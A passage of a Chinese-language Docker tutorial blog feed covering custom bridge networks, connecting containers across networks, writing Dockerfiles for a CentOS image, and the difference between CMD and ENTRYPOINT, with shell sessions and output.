class="bash">我们可以自定义一个网络！</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> --driver bridge</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> --subnet 192.168.0.0/16 192.168.0.2~192.168.255.255</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> --gateway 192.168.0.1</span></span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet</span><br><span class="line">81006dbc871debc46b8e531c41ad9be431d7150f7cb2f0a0db10ac07583cdd05</span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker network ls</span><br><span class="line">NETWORK ID     NAME      DRIVER    SCOPE</span><br><span class="line">4500a6cd34fa   bridge    bridge    local</span><br><span class="line">dc323b7a20eb   host      host      local</span><br><span class="line">81006dbc871d   mynet     bridge    local</span><br><span class="line">8289f381d1ea   none      null      local</span><br></pre></td></tr></table></figure><p>我们自己的网络就创建好了</p><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210114102105468.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210114102105468.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210114102105468"></p><p>我们来测试一下自定义网络的效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker run -d -P --name tomcat-net-01 --net mynet tomcat</span><br><span class="line">9814d6248e8178a7a532bddd71c7fe2933778a1e9a9df79b09a31dae2b024971</span><br><span class="line"></span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# </span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker run -d -P --name tomcat-net-02 --net mynet tomcat</span><br><span class="line">ee10fbc43978a4a6867e9226fa65e3b30597d98e553e3c5aa59986d9c667031c</span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec tomcat-net-01 ping tomcat-net-02</span><br><span class="line">PING tomcat-net-02 (192.168.0.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from tomcat-net-02.mynet (192.168.0.3): icmp_seq=1 ttl=64 time=0.056 ms</span><br><span class="line">64 bytes from tomcat-net-02.mynet (192.168.0.3): icmp_seq=2 ttl=64 time=0.064 ms</span><br><span class="line">64 bytes from tomcat-net-02.mynet (192.168.0.3): icmp_seq=3 ttl=64 time=0.061 ms</span><br><span class="line"><span class="meta">#</span><span class="bash">测试ping连接发现，不使用--link也可以直接ping名字来ping通</span></span><br></pre></td></tr></table></figure><p>我们自定义的网络docker都已经帮我们维护好了对应的关系，推荐我们平时这样使用网络！</p><blockquote><p>好处：</p><p>redis- 不同的集群使用不同的网络，保证集群是安全和健康的</p><p>mysql-不同的集群使用不同的网络，保证集群是安全和健康的</p></blockquote><h3 id="网络连通"><a href="#网络连通" class="headerlink" title="网络连通"></a>网络连通</h3><hr><p>我们现在来解决一个这样的问题</p><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210114182535284.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210114182535284.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210114182535284"></p><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210114181516237.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210114181516237.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210114181516237"></p><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210114181646419.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210114181646419.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210114181646419"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">01 连通</span></span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker run -d -P --name tomcat01 tomcat</span><br><span class="line">2e9c44d7c622cbef589abfbb2365bcf0fe845a7383cff6dde466dea260513cd9</span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND             CREATED         STATUS         PORTS                     NAMES</span><br><span class="line">2e9c44d7c622   tomcat    &quot;catalina.sh run&quot;   7 seconds ago   Up 6 seconds   0.0.0.0:49160-&gt;8080/tcp   tomcat01</span><br><span class="line">ee10fbc43978   tomcat    &quot;catalina.sh run&quot;   8 hours ago     Up 8 hours     0.0.0.0:49159-&gt;8080/tcp   tomcat-net-02</span><br><span class="line">9814d6248e81   tomcat    &quot;catalina.sh run&quot;   8 hours ago     Up 8 hours     0.0.0.0:49158-&gt;8080/tcp   tomcat-net-01</span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker network connect mynet tomcat01 </span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat01 ping tomcat-net-01</span><br><span class="line">PING tomcat-net-01 (192.168.0.2) 56(84) bytes of data.</span><br><span class="line">64 bytes from tomcat-net-01.mynet (192.168.0.2): icmp_seq=1 ttl=64 time=0.062 ms</span><br><span class="line">64 bytes from tomcat-net-01.mynet (192.168.0.2): icmp_seq=2 ttl=64 time=0.054 ms</span><br><span class="line">64 bytes from tomcat-net-01.mynet (192.168.0.2): icmp_seq=3 ttl=64 time=0.062 ms</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">02 依旧连不通</span></span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker run -d -P --name tomcat02 tomcat</span><br><span class="line">523e4e9c3fa37b4d5040e182621087089edb308bb47a8b4d5dd7860625786a48</span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat02 ping tomcat-net-01</span><br><span class="line">ping: tomcat-net-01: Name or service not known</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结论：假设要跨网络操作别人，就需要使用docker network connect 连通！</p><blockquote><p>原理其实是相当于给tomcat01增添了一张网卡，即一容器双ip</p></blockquote><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210114183026006.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210114183026006.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210114183026006"></p><h3 id="实战：部署redis集群"><a href="#实战：部署redis集群" class="headerlink" title="实战：部署redis集群"></a>实战：部署redis集群</h3><hr><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210114183224177.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210114183224177.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210114183224177"></p>]]></content>
      
      
      <categories>
          
          <category> linux运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker从入门到精通(四)</title>
      <link href="2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E5%9B%9B/"/>
      <url>2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<p>dockerfile构建</p><span id="more"></span><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><hr><h3 id="Dockerfile介绍"><a href="#Dockerfile介绍" class="headerlink" title="Dockerfile介绍"></a>Dockerfile介绍</h3><p>dockerfile 是用来构建docker镜像的文件！命令参数脚本！</p><p>构建步骤：</p><ol><li>编写一个dockerfile文件</li><li>docker build 构建成为一个镜像</li><li>docker run 运行镜像</li><li>docker push 发布镜像（Dockerhub、阿里云镜像仓库！） </li></ol><h3 id="Dockerfile构建"><a href="#Dockerfile构建" class="headerlink" title="Dockerfile构建"></a>Dockerfile构建</h3><p>基础知识：</p><ol><li>每个关键字（指令）都是必须是大写字母</li><li>执行顺序从上到下</li><li>#表示注释</li><li>每个指令会提交一个新的镜像层，并提交</li></ol><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E5%9B%9B/1607259128922.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E5%9B%9B/1607259128922.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1607259128922"></p><p>dockerfile是面向开发的，发布项目，做镜像，就需要编写dockerfile文件</p><p>Docker镜像逐渐成为企业交付的标准，必须掌握</p><p>DockerFile:构建文件，定义了一切的步骤，源代码</p><p>DockerImages:通过DockerFile构建生成的镜像，最终发布和云行的产品！</p><p>Docker容器：容器就是镜像运行起来提供服务</p><h3 id="DockerFile"><a href="#DockerFile" class="headerlink" title="DockerFile"></a>DockerFile</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FROM               #基础镜像，一起从此开始</span><br><span class="line">MAINTAINER          #镜像是谁的，姓名+邮箱</span><br><span class="line">RUN    #镜像构建的时候需要运行的命令</span><br><span class="line">ADD                 #步骤：tomcat镜像，这个tomcat压缩包！添加内容</span><br><span class="line">WORKDIR             #镜像的工作目录</span><br><span class="line">VOLUME              #挂载的目录</span><br><span class="line">EXPOSE              #保留端口配置     </span><br><span class="line">CMD                 #指定这个容器启动的时候需要运行的命令，只有最后一个声响，可被代替</span><br><span class="line">ENTRYPOINT        #指定这个容器启动的时候运行的命令，可以追加命令</span><br><span class="line">ONBUILD             #当构建一个被继承 Dockerfile这个时候就会运行 ONBUILD的指令。触发</span><br><span class="line">COPY                #类似ADD，将我们的文件拷贝到镜像中</span><br><span class="line">ENV                 #构建的时候设置环境变量 </span><br></pre></td></tr></table></figure><h3 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h3><hr><p>centos官方dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> scratch</span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> centos-8-x86_64.tar.xz /</span></span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> org.label-schema.schema-version=<span class="string">&quot;1.0&quot;</span>     org.label-schema.name=<span class="string">&quot;CentOS Base Image&quot;</span>     org.label-schema.vendor=<span class="string">&quot;CentOS&quot;</span>     org.label-schema.license=<span class="string">&quot;GPLv2&quot;</span>     org.label-schema.build-date=<span class="string">&quot;20201204&quot;</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;/bin/bash&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>我们发现官方给镜像里面很多工具没有，例如vim 等，我们来自己构建一个dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">MAINTAINER</span> M0th&lt;<span class="number">1757186769</span>@qq.com&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> MYPATH /usr/local</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> <span class="variable">$MYPATH</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum -y install vim</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum -y install net-tools</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$MYPATH</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;----end----&quot;</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">[root@iZ8vbgt047thtwcw9p956rZ test]# cat mydockerfile </span><br><span class="line">FROM centos</span><br><span class="line">MAINTAINER M0th&lt;1757186769@11.com&gt;</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line"></span><br><span class="line">RUN yum -y install vim</span><br><span class="line">RUN yum -y install net-tools</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line">CMD echo $MYPATH</span><br><span class="line">CMD echo &quot;----end----&quot;</span><br><span class="line">CMD /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash">2、通过文件构建镜像</span></span><br><span class="line"><span class="meta">#</span><span class="bash">命令 docker build -f dockerfile 文件路径 -t 镜像名:[tag]</span></span><br><span class="line">Successfully built 09722080dad6</span><br><span class="line">Successfully tagged mycentos:latest</span><br><span class="line"><span class="meta">#</span><span class="bash">3、测试运行</span></span><br><span class="line">[root@iZ8vbgt047thtwcw9p956rZ test]# docker run -it mycentos </span><br><span class="line">[root@26b20d819388 local]# ls</span><br><span class="line">bin  etc  games  include  lib  lib64  libexec  sbin  share  src</span><br><span class="line">[root@26b20d819388 local]# pwd</span><br><span class="line">/usr/local</span><br><span class="line">[root@26b20d819388 local]# vim test</span><br><span class="line">[root@26b20d819388 local]# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.4  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        ether 02:42:ac:11:00:04  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们还可以通过history命令看镜像构建过程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@iZ8vbgt047thtwcw9p956rZ test]# docker history mycentos</span><br><span class="line">IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT</span><br><span class="line">09722080dad6        6 minutes ago       /bin/sh -c #(nop)  CMD [&quot;/bin/sh&quot; &quot;-c&quot; &quot;/bin…   0B                  </span><br><span class="line">00d825fd5f9f        6 minutes ago       /bin/sh -c #(nop)  CMD [&quot;/bin/sh&quot; &quot;-c&quot; &quot;echo…   0B                  </span><br><span class="line">616a7de62927        6 minutes ago       /bin/sh -c #(nop)  CMD [&quot;/bin/sh&quot; &quot;-c&quot; &quot;echo…   0B                  </span><br><span class="line">38232d298601        6 minutes ago       /bin/sh -c #(nop)  EXPOSE 80                    0B                  </span><br><span class="line">79f3886fd670        6 minutes ago       /bin/sh -c yum -y install net-tools             23.2MB              </span><br><span class="line">cc0bab19e0d6        6 minutes ago       /bin/sh -c yum -y install vim                   57.7MB              </span><br><span class="line">f55ce5bdb633        6 minutes ago       /bin/sh -c #(nop) WORKDIR /usr/local            0B                  </span><br><span class="line">8d2fe8dc59da        6 minutes ago       /bin/sh -c #(nop)  ENV MYPATH=/usr/local        0B                  </span><br><span class="line">e58dfb8f0b53        6 minutes ago       /bin/sh -c #(nop)  MAINTAINER M0th&lt;175718676…   0B                  </span><br><span class="line">0d120b6ccaa8        4 months ago        /bin/sh -c #(nop)  CMD [&quot;/bin/bash&quot;]            0B                  </span><br><span class="line">&lt;missing&gt;           4 months ago        /bin/sh -c #(nop)  LABEL org.label-schema.sc…   0B                  </span><br><span class="line">&lt;missing&gt;           4 months ago        /bin/sh -c #(nop) ADD file:538afc0c5c964ce0d…   215MB              </span><br></pre></td></tr></table></figure><p>那么平时我们拿到一个镜像，可以研究一下他是怎么做的了</p><h3 id="CMD和ENTRYPOINT区别"><a href="#CMD和ENTRYPOINT区别" class="headerlink" title="CMD和ENTRYPOINT区别"></a>CMD和ENTRYPOINT区别</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CMD   #指定这个容器启动的时候要运行的命令，只有最后一个会生效，可被代替</span><br><span class="line">ENTRYPOINT  #指定这个容器启动的时候要运行的命令,可以追加命令</span><br></pre></td></tr></table></figure><p>测试cmd</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@iZ8vbgt047thtwcw9p956rZ test]# vim dockerfile-test-cmd</span><br><span class="line">[root@iZ8vbgt047thtwcw9p956rZ test]# cat dockerfile-test-cmd </span><br><span class="line">FROM centos</span><br><span class="line">CMD [&quot;ls&quot;,&quot;-a&quot;]</span><br><span class="line"><span class="meta">#</span><span class="bash">构建镜像</span></span><br><span class="line">[root@iZ8vbgt047thtwcw9p956rZ test]# docker build -f dockerfile-test-cmd -t testcmd .</span><br><span class="line">Sending build context to Docker daemon  4.096kB</span><br><span class="line">Step 1/2 : FROM centos</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 0d120b6ccaa8</span></span><br><span class="line">Step 2/2 : CMD [&quot;ls&quot;,&quot;-a&quot;]</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 59bcf777596f</span></span><br><span class="line">Removing intermediate container 59bcf777596f</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 7a64bf7d89ee</span></span><br><span class="line">Successfully built 7a64bf7d89ee</span><br><span class="line">Successfully tagged testcmd:latest</span><br><span class="line"><span class="meta">#</span><span class="bash">run运行，发现我们 ls -a命令可以执行 但是测试追加 l参数，ls -al并不可以执行</span></span><br><span class="line">[root@iZ8vbgt047thtwcw9p956rZ test]# docker run testcmd -l</span><br><span class="line">docker: Error response from daemon: OCI runtime create failed: container_linux.go:349: starting container process caused &quot;exec: \&quot;l\&quot;: executable file not found in $PATH&quot;: unknown.</span><br><span class="line">[root@iZ8vbgt047thtwcw9p956rZ test]# docker run testcmd</span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">.dockerenv</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">lost+found</span><br><span class="line"><span class="meta">#</span><span class="bash">cmd下 -l 替换了CMD[<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-a&quot;</span>] 命令， -l不是命令所以并不执行</span></span><br></pre></td></tr></table></figure><p>测试ENTRYPOINT</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[root@iZ8vbgt047thtwcw9p956rZ test]# vim dockerfile-test-entrypoint</span><br><span class="line">[root@iZ8vbgt047thtwcw9p956rZ test]# cat dockerfile-test-entrypoint </span><br><span class="line">FROM centos</span><br><span class="line">ENTRYPOINT [&quot;ls&quot;,&quot;-a&quot;]</span><br><span class="line">[root@iZ8vbgt047thtwcw9p956rZ test]# docker build -f dockerfile-test-entrypoint  -t testentrypoint .</span><br><span class="line">Sending build context to Docker daemon   5.12kB</span><br><span class="line">Step 1/2 : FROM centos</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 0d120b6ccaa8</span></span><br><span class="line">Step 2/2 : ENTRYPOINT [&quot;ls&quot;,&quot;-a&quot;]</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 0798fc1d09ab</span></span><br><span class="line">Removing intermediate container 0798fc1d09ab</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 51a72cfdbc4d</span></span><br><span class="line">Successfully built 51a72cfdbc4d</span><br><span class="line">Successfully tagged testentrypoint:latest</span><br><span class="line">[root@iZ8vbgt047thtwcw9p956rZ test]# docker run testentrypoint</span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">.dockerenv</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">lost+found</span><br><span class="line">var</span><br><span class="line">[root@iZ8vbgt047thtwcw9p956rZ test]# docker run testentrypoint -l</span><br><span class="line">total 56</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec  9 13:19 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec  9 13:19 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Dec  9 13:19 .dockerenv</span><br><span class="line">lrwxrwxrwx   1 root root    7 May 11  2019 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x   5 root root  340 Dec  9 13:19 dev</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec  9 13:19 etc</span><br><span class="line">drwxr-xr-x   2 root root 4096 May 11  2019 home</span><br><span class="line">lrwxrwxrwx   1 root root    7 May 11  2019 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx   1 root root    9 May 11  2019 lib64 -&gt; usr/lib64</span><br><span class="line">drwx------   2 root root 4096 Aug  9 21:40 lost+found</span><br><span class="line"><span class="meta">#</span><span class="bash">run运行，发现我们 ls -a命令可以执行 但是测试追加 l参数，ls -al可以执行</span></span><br></pre></td></tr></table></figure><h3 id="实战-Tomcat镜像"><a href="#实战-Tomcat镜像" class="headerlink" title="实战:Tomcat镜像"></a>实战:Tomcat镜像</h3><hr><ol><li><p>准备镜像文件 tomcat 